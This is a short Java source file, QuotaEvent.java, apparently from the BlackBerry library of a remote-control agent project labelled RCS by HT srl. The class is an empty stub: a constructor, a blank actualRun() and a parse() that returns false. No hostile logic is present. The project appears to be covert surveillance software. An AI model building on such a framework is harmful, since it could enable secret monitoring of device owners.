//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : QuotaEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;


/**
 * The Class QuotaEvent.
 */
public final class QuotaEvent extends Event {
    //#ifdef DEBUG
    //#endif
    
    /**
     * Instantiates a new quota event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public QuotaEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_QUOTA, actionId, confParams, "QuotaEvent");
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        

    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        
        return false;
    }

}
